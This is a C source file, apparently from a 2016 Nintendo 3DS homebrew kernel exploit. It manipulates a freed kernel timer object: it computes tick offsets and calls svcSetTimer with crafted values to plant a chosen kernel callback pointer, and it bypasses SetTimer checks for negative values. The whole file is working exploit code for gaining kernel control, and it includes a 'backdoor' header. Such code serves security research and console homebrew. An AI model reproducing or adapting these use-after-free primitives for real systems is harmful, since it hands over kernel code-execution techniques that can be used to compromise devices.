/* Code related to setting up freed timer.
 * Ned Williamson 2016
 */

#include <stdio.h>
#include <3ds.h>

#include "timer.h"
#include "backdoor.h"

static u64 get_tick_offset() {
  /* To find this: run svcGetSystemTick, then do SetTimer(timer, 100000, 100000)
   * or something then lookup the object's initial timer value and compare
   * the recorded svcGetSystemTick value with the KTimer one - 100000.
   * I wrote a helper called `get_timer_value` to make this easier.
   */
  double init = (double)svcGetSystemTick();
  u64 offset = (u64)(3.729786579754653 * init - 4494.765251159668);
  return offset;
}

static bool set_timer_negative(Handle timer, u32 kernel_callback_int, int error) {
  if (!(kernel_callback_int & 0x80000000)) {
    printf("set_timer_negative called with non-negative arg\n");
    return false;
  }

  Result res;
  u64 kernel_callback_shifted_goal, timeout;

  kernel_callback_shifted_goal = ((u64)0x80000000 + error) << 32;
  timeout = ((u64)(kernel_callback_int - 0x80000000) << 32);
  u64 offset = get_tick_offset();

  u64 kernel_callback_offset = kernel_callback_shifted_goal - offset;
  if ((s64)kernel_callback_offset < 0 || (s64)timeout < 0) {
    printf("oops: kernel_callback_offset < 0 or timeout < 0\n");
    return false;
  }
  
  printf("Should reach: %llx\n", kernel_callback_shifted_goal + timeout * 3);
  //return false;
  
  /* now we have the offset and timeout, actually set the value */
  res = svcSetTimer(timer, kernel_callback_offset, timeout);
  if (res < 0) {
    printf("failed to set timer: 0x%lx\n", res);
    return false;
  }
  
  s32 out;
  // wait for timer to tick with no timeout (should be instant)
  s32 handlecount = 1;
  bool waitall = true;
  res = svcWaitSynchronizationN(&out, &timer, handlecount, waitall, -1);
  if (res < 0) {
    printf("failed to wait on timer\n");
    return false;
  }

  res = svcCancelTimer(timer);
  if (res < 0) {
    printf("failed to cancel timer\n");
    return false;
  }

  return true;
}

bool set_timer(Handle timer, u32 kernel_callback_int, int error) {
  /* if upper bit is set we need to workaround settimer checks */
  if (kernel_callback_int & 0x80000000) {
    return set_timer_negative(timer, kernel_callback_int, error);
  }

  u64 callback_offset = (((u64)kernel_callback_int) << 32) - get_tick_offset();
  Result res = svcSetTimer(timer, callback_offset, 0);
  if (res < 0) {
    printf("set_timer: svcSetTimer(%ld, %lld, 0) -> 0x%lx\n",
           timer, callback_offset, res);
    return false;
  }

  return true;
}
